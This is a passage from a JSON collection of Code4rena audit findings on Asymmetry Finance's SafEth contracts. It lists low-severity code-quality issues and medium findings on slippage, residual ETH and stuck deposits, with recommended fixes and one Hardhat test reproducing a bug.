      "content": "\nThe solidity [documentation](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions) recommends the following order for functions:\n\n- constructor\n- receive function (if exists)\n- fallback function (if exists)\n- external\n- public\n- internal\n- private\n\nThe receive() functions are currently in the bottom on the contract.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L246\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L97\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L244\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L126\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19957",
      "title": "[22] Imports can be group",
      "impact": "LOW",
      "content": "\nConsider grouping the imports, e.g. first libraries, then interfaces, the storage.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L4-L11\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19956",
      "title": "[21] Usage of return named variables and explicit values",
      "impact": "LOW",
      "content": "\nSome functions return named variables, others return explicit values.\n\nFollowing function returns an explicit value.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242\n\nFollowing function return returns a named variable.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102\n\nConsider adopting the same approach throughout the codebase to improve the explicitness and readability of the code.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19955",
      "title": "[20] Variable shadowing",
      "impact": "LOW",
      "content": "\nConsider renaming the variable `totalSupply` in `SafEth.stake()`, since it's being shadowed by `ERC20Upgradeable.totalSupply()`.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L77\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19954",
      "title": "[19] In `SafEth.adjustWeight()` there's no need to loop all derivatives",
      "impact": "LOW",
      "content": "\nIt's possible to decrease the old weight and increase the new weight to compute `localTotalWeight` and update `totalWeight`.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19953",
      "title": "[18] Incorrect NATSPEC",
      "impact": "LOW",
      "content": "\n`SafEth.adjustWeight()` contains an incorrect @notice.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L158\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19952",
      "title": "[17] Missing unit tests",
      "impact": "LOW",
      "content": "\nThe derivative contracts don't have all functions and branches covered.\n\nIt is crucial to write tests with possibly 100% coverage for smart contracts. It is recommended to write tests for all possible code flows.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19951",
      "title": "[16] Unnecessary calculation",
      "impact": "LOW",
      "content": "\nMultiplying by `10**18` and dividing by `10**18` is not needed on L215 of `Reth.sol`.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L215\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19950",
      "title": "[15] Variable being initialized with the default value",
      "impact": "LOW",
      "content": "\nUnsigned integers will already be initalized with zero on their declaration, e.g. there's no need to manually assign zero.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L68\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19949",
      "title": "[14] Calls for retrieving the balance can be cached",
      "impact": "LOW",
      "content": "\n`derivatives[i].balance()` can be cached on the following instance.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L141-L142\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19948",
      "title": "[13] Check for stale values on setter functions",
      "impact": "LOW",
      "content": "\nAdd a check ensuring that the new value if different than the current value to avoid emitting unnecessary events.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L214-L217\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L223-L226\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19947",
      "title": "[12] Lack of old and new value for events related to parameter updates",
      "impact": "LOW",
      "content": "\nEvents that mark critical parameter changes should contain both the old and the new value.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19946",
      "title": "[11] Lack of event for parameters changes",
      "impact": "LOW",
      "content": "\nAdding an event will facilitate offchain monitoring when changing system parameters.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L48-L50\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L58-L60\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L51-L53\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19945",
      "title": "[10] Critical changes should use a two-step pattern and a timelock",
      "impact": "LOW",
      "content": "\nLack of two-step procedure for critical operations leaves them error-prone.\n\nConsider adding a two-steps pattern and a timelock on critical changes to avoid modifying the system state.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L223-L226\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L232-L235\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19944",
      "title": "[09] Don't allow adding a new derivative when staking/unstaking is paused",
      "impact": "LOW",
      "content": "\nWhen the system is in pause mode, e.g. staking and unstaking is blocked, consider adding a check to prevent new derivatives from being added, e.g.\n\n```\nrequire(!pausedStaking && !pauseUnstaking, \"error\");\n```\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L182-L195\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19943",
      "title": "[08] Lack of setter functions for third party integrations",
      "impact": "LOW",
      "content": "\nMisdeployed values can cause failure of integrations. One addition that can be made is to add setter functions for the owner to update these addresses if necessary.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L13-L18\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L20-L27\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L14-L21\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19942",
      "title": "[07] Lack of address(0) checks",
      "impact": "LOW",
      "content": "\nInput addresses should be checked against address(0) to prevent unexpected behavior.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L33-L36\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L42-L45\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L36-L38\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19941",
      "title": "[06] Pragma float",
      "impact": "LOW",
      "content": "\nAll contracts in scope are floating the pragma version.\n\nLocking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version.\n\nNote that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19940",
      "title": "[05] Emit events before external calls",
      "impact": "LOW",
      "content": "\nMultiple functions in the project emit an event as the last statement. Wherever possible, consider emitting events before external calls. In case of reentrancy, funds are not at risk (for external call + event ordering), however emitting events after external calls can damage frontends and monitoring tools in case of reentrancy attacks.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19939",
      "title": "[04] Unbounded loop",
      "impact": "LOW",
      "content": "\nThere are multiple instances of loops executing external calls where the number of iterations is unbounded and controlled by the number of derivatives. This is not an issue on the current setup, since there are only three derivatives. \n\nHowever, if a large amount of derivative gets added, functionalities like `stake()` and `unstake()` could run out of gas and revert.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L84-L96\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L113-L119\n\n### Recommendation\n\nLimit the maximum number of derivatives that can be added.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19938",
      "title": "[03] Reentrancy for `SafEth.unstake()`",
      "impact": "LOW",
      "content": "\nThere is a reentrancy possibility in `SafEth.unstake()` where the tokens are burned only after the derivative withdraw.\n\nIf the `derivatives[i].withdraw()` external call where to reenter into `SafEth.unstake()`, the `safEthAmount` is still not updated, since the `_burn()` is only called after, and the function doesn't contain a nonReentranct modifier.\n\nNote: this would only be an issue for a malicious derivative contract.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L113-L120\n\n### Recommendation\n\nCall `_burn()` before `derivatives[i].withdraw()` in `SafEth.unstake()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19937",
      "title": "[02] Lack of method to remove derivatives",
      "impact": "LOW",
      "content": "\nIn case a derivative gets added by mistake or with incorrect parameters, currently this derivative would remain stuck in `SafEth.sol`.\n\n### Recommendation\n\nConsider adding a method that allows removing derivatives from `SafEth.sol`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19936",
      "title": "[01] Add checks for weight values",
      "impact": "LOW",
      "content": "\nCurrently it's possible to set any value for the weights. Some combinations for weights could result in issues while calculating `ethAmount`.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L169\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L187\n\nFor example, assuming the minimum value for msg.value, three derivatives and strange values for the weights.\n\n```\nmsg.value = 5e17 = 0.5e18\nweight1 = 5e17   = 0.5e18\nweight2 = 19e18  =  19e18\nweight3 = 19e19  = 190e18\n\nethAmount = (msg.value * weight) / totalWeight\n5e17 * 5e17 / (5e17 + 19e18 + 19e19)\n```\n\nThis would result in `1193317422434367.5` which would round down in solidity.\n\nhttps://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L88\n\n### Recommendation\n\nAdd checks for min and max values for weights.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19935",
      "title": "[M-12] No slippage protection on `stake()` in SafEth.sol",
      "impact": "MEDIUM",
      "content": "\n`mintAmount` is determined both by `totalStakeValueEth` and `preDepositPrice`. While the former is associated with external interactions beyond users' control, the latter should be linked to a slippage control to incentivize more staker participations.\n\n### Proof of Concept\n\nAs can be seen from the code block below, `ethPerDerivative()` serves to get the price of each derivative in terms of ETH. Although it is presumed the prices entailed would be closely/stably pegged 1:1, no one could guarantee the degree of volatility just as what has recently happened to the USDC depeg.\n\n[File: SafEth.sol#L71-L81](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L71-L81)\n\n```solidity\n        for (uint i = 0; i < derivativeCount; i++)\n            underlyingValue +=\n                (derivatives[i].ethPerDerivative(derivatives[i].balance()) *\n                    derivatives[i].balance()) /\n                10 ** 18;\n\n        uint256 totalSupply = totalSupply();\n        uint256 preDepositPrice; // Price of safETH in regards to ETH\n        if (totalSupply == 0)\n            preDepositPrice = 10 ** 18; // initializes with a price of 1\n        else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\n```\n\nWhen `underlyingValue` is less than `totalSupply`, `preDepositPrice` will be smaller and inversely make `mintAmount` bigger, and vice versa.\n\nAny slight change in price movement in the same direction can be consistently cumulative and reflective in stake calculations. This can make two stakers calling `stake()` with the same ETH amount minutes apart getting minted different amount of stake ERC20 tokens.\n\n### Recommended Mitigation Steps\n\nConsider having a user inputtable `minMintAmountOut` added in the function parameters of `stake()` and the function logic refactored as follows:\n\n```diff\n-    function stake() external payable {\n+    function stake(uint256 minMintAmountOut) external payable {\n\n        [... Snipped ...]\n\n        _mint(msg.sender, mintAmount);\n+        require(shares >= minSharesOut, \"mint amount too low\");\n\n        [... Snipped ...]\n```\n\nIdeally, this slippage calculation should be featured in the UI, with optionally selectable stake amount impact, e.g. 0.1%.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Pass in minAmount.<br>\n\n**Status:** Incorrectly mitigated. Full details in reports from d3e4 ([here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/67) and [here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/66)) and [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/57) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `mintAmount` calculation in the `stake()` function of the SafEth.sol contract. This calculation is determined by both `totalStakeValueEth` and `preDepositPrice`, with the latter being linked to a slippage control to incentivize more staker participations. As seen from the code block, `ethPerDerivative()` serves to get the price of each derivative in terms of ETH, however, there is no guarantee of the degree of volatility. When `underlyingValue` is less than `totalSupply`, `preDepositPrice` will be smaller and inversely make `mintAmount` bigger, and vice versa. This can lead to two stakers calling `stake()` with the same ETH amount minutes apart getting minted different amount of stake ERC20 tokens.\n\nTo mitigate this issue, it is recommended to have a user inputtable `minMintAmountOut` added in the function parameters of `stake()` and the function logic refactored. This slippage calculation should be featured in the UI, with optionally selectable stake amount impact, e.g. 0.1%. However, this mitigation was found to be incorrect, and further details can be found in reports from d3e4 and adriro.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/150",
      "tags": [],
      "finders": [
        "d3e4",
        "BPZ",
        "yac",
        "rbserver",
        "whoismatthewmc1",
        "handsomegiraffe",
        "RedTiger",
        "RaymondFam",
        "ladboy233",
        "Parad0x",
        "fyvgsk",
        "silviaxyz",
        "0xepley",
        "Franfran"
      ]
    },
    {
      "id": "19934",
      "title": "[M-11] Residual ETH unreachable and unutilized in SafEth.sol",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L246><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L124-L127><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L138-L155>\n\nUnlike the other three contracts in scope, SafEth.sol does not have a measure in place to utilize the residual ETH, be it:\n\n*   accidentally received,\n*   zero ETH output from `unstake()` arising from recipient non-contract existence, or\n*   ETH sent in via `stake()` fails to deposit into a derivative due to uninitialized derivatives and weights, as I have explained in a separate submission.\n\nIn the derivative contracts, the above issue is wiped clean via `address(this).balance` every time `withdraw()` is predominantly invoked in [`unstake()`](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L118) of SafEth.sol:\n\n[File: WstEth.sol#L63-L66](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L63-L66)<br>\n[File: SfrxEth.sol#L84-L87](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L84-L87)<br>\n[File: Reth.sol#L110-L114](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L110-L114)<br>\n\n```soildity\n        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n            \"\"\n        );\n        require(sent, \"Failed to send Ether\");\n```\n\n### Proof of Concept\n\nAs in SafETH.sol, `ethAmountBefore` and `ethAmountAfter` are used to determine `ethAmountToWithdraw` or `ethAmountToRebalance` respectively in `untake()` and `rebalanceToWeights()`:\n\n[File: SafEth.sol](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol)\n\n```solidity\n111:        uint256 ethAmountBefore = address(this).balance;\n\n121:        uint256 ethAmountAfter = address(this).balance;\n\n122:        uint256 ethAmountToWithdraw = ethAmountAfter - ethAmountBefore;\n\n139:        uint256 ethAmountBefore = address(this).balance;\n\n144:        uint256 ethAmountAfter = address(this).balance;\n\n145:        uint256 ethAmountToRebalance = ethAmountAfter - ethAmountBefore;\n```\n\n### Recommended Mitigation Steps\n\nConsider having `rebalanceToWeights()` refactored as follows:\n\n[File: SafEth.sol#L138-L155](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L138-L155)\n\n```diff\n    function rebalanceToWeights() external onlyOwner {\n-        uint256 ethAmountBefore = address(this).balance;\n        for (uint i = 0; i < derivativeCount; i++) {\n            if (derivatives[i].balance() > 0)\n                derivatives[i].withdraw(derivatives[i].balance());\n        }\n-        uint256 ethAmountAfter = address(this).balance;\n-        uint256 ethAmountToRebalance = ethAmountAfter - ethAmountBefore;\n+        uint256 ethAmountToRebalance = address(this).balance;\n\n        for (uint i = 0; i < derivativeCount; i++) {\n            if (weights[i] == 0 || ethAmountToRebalance == 0) continue;\n            uint256 ethAmount = (ethAmountToRebalance * weights[i]) /\n                totalWeight;\n            // Price will change due to slippage\n            derivatives[i].deposit{value: ethAmount}();\n        }\n        emit Rebalanced();\n    }\n```\n\nThis will at least have the residual ETH harnessed and distributed to all existing stakers whenever `rebalanceToWeights()` is called.\n\n**[toshiSat (Asymmetry) disputed via duplicate issue `#455`](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/455#issuecomment-1500603245)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Use entire balance for rebalance.<br>\n\n**Status:** Partially mitigated. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/65) and [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/55) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the contract SafEth.sol, which is part of a project on GitHub. The issue is that there is no measure in place to utilize the residual ETH, which can be accidentally received, zero ETH output from unstake() arising from recipient non-contract existence, or ETH sent in via stake() fails to deposit into a derivative due to uninitialized derivatives and weights. In the derivative contracts, this issue is wiped clean via address(this).balance every time withdraw() is invoked in unstake() of SafEth.sol. \n\nProof of concept is provided, which shows that ethAmountBefore and ethAmountAfter are used to determine ethAmountToWithdraw or ethAmountToRebalance respectively in unstake() and rebalanceToWeights() of SafEth.sol. \n\nRecommended mitigation steps are provided, which suggest that rebalanceToWeights() should be refactored to use the entire balance for rebalance. It is mentioned that this will at least have the residual ETH harnessed and distributed to all existing stakers whenever rebalanceToWeights() is called. \n\nIt is also mentioned that the mitigation has been partially mitigated, with full details in reports from d3e4 and adriro.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/152",
      "tags": [],
      "finders": [
        "yac",
        "jasonxiale",
        "koxuan",
        "SunSec",
        "Phantasmagoria",
        "mojito\\_auditor",
        "juancito",
        "eyexploit",
        "aviggiano",
        "d3e4",
        "rotcivegaf",
        "RaymondFam",
        "LeoGold",
        "chaduke",
        "n33k",
        "7siech",
        "adeolu",
        "neumo",
        "anodaram"
      ]
    },
    {
      "id": "19933",
      "title": "[M-10] Stuck ether when use function `stake` with empty `derivatives`(`derivativeCount` = 0)",
      "impact": "MEDIUM",
      "content": "\nAfter `initialize` the contract `SafEth`, if someone call `stake` before `addDerivative`, the function `stake` skip the two for cycles because the `derivativeCount` is equal to `0` and don't `deposit` in the `derivative` contract also mint `0` tokens to the sender. Finally the amount of `msg.value` will stuck in the contract\n\n### Proof of Concept\n\n```typescript\n/* eslint-disable new-cap */\nimport { network, upgrades, ethers } from \"hardhat\";\nimport { expect } from \"chai\";\nimport { SignerWithAddress } from \"@nomiclabs/hardhat-ethers/signers\";\nimport { SafEth } from \"../typechain-types\";\n\ndescribe(\"stake tests\", function () {\n  let adminAccount: SignerWithAddress;\n  let safEthProxy: SafEth;\n  const depositAmount = ethers.utils.parseEther(\"200\");\n\n  before(async () => {\n    const latestBlock = await ethers.provider.getBlock(\"latest\");\n\n    await network.provider.request({\n      method: \"hardhat_reset\",\n      params: [{forking: {\n        jsonRpcUrl: process.env.MAINNET_URL,\n        blockNumber: latestBlock.number,\n      }}],\n    });\n\n    const accounts = await ethers.getSigners();\n    adminAccount = accounts[0];\n\n    safEthProxy = await upgrades.deployProxy(\n      await ethers.getContractFactory(\"SafEth\"),\n      [\n        \"Asymmetry Finance ETH\",\n        \"safETH\",\n      ]\n    ) as SafEth;\n    await safEthProxy.deployed();\n  });\n\n  it(\"PoC: don't have derivatives\", async function () {\n    // Check: don't have derivatives\n    expect(await safEthProxy.derivativeCount()).eq(0);\n\n    // This transaction should revert\n    await safEthProxy.stake({ value: depositAmount });\n\n    const ethBal = await ethers.provider.getBalance(safEthProxy.address);\n    const stakerBal = await safEthProxy.balanceOf(adminAccount.address);\n    // This log 200 ether, but should be 0\n    console.log(\"safEthProxy Balance:\", ethBal.toString());\n    // The staker has 0 tokens\n    console.log(\"staker Balance:\", stakerBal.toString());\n  });\n});\n```\n\n### Recommended Mitigation Steps\n\nWhen stake the `derivativeCount` should be greater than `0`:\n\n```solidity\n@@ -64,6 +64,7 @@ contract SafEth is\n         require(pauseStaking == false, \"staking is paused\");\n         require(msg.value >= minAmount, \"amount too low\");\n         require(msg.value <= maxAmount, \"amount too high\");\n+        require(derivativeCount > 0, \"derivativeCount is zero\");\n\n         uint256 underlyingValue = 0;\n```\n\n**[toshiSat (Asymmetry) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363#issuecomment-1500615415):**\n> Seems like low severity to me.\n\n**[Picodes (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363#issuecomment-1518071069)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Check derivativeCount on stake.<br>\n\n**Status:** Incorrectly mitigated. Full details in reports from [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54) and [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/38) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the contract SafEth where if someone calls the stake function before adding a derivative, the stake function will skip the two for cycles, not deposit in the derivative contract, and mint 0 tokens to the sender. This means that the amount of msg.value will be stuck in the contract. This bug has been assigned a medium severity, and Asymmetry mitigated the issue by checking the derivativeCount on stake. However, this solution was incorrectly mitigated, and the bug has not been fully resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363",
      "tags": [],
      "finders": [
        "Emmanuel",
        "ArbitraryExecution",
        "brgltd",
        "idkwhatimdoing",
        "vagrant",
        "Cryptor",
        "nemveer",
        "ayden",
        "Evo",
        "ToonVH",
        "d3e4",
        "Co0nan",
        "hihen",
        "rotcivegaf",
        "UdarTeam",
        "wait",
        "codetilda",
        "pfapostol",
        "alexzoid",
        "7siech",
        "0xc0ffEE",
        "carlitox477"
      ]
    },
    {
      "id": "19932",
      "title": "[M-09] Non-ideal rETH/WETH pool used pays unnecessary fees",
      "impact": "MEDIUM",
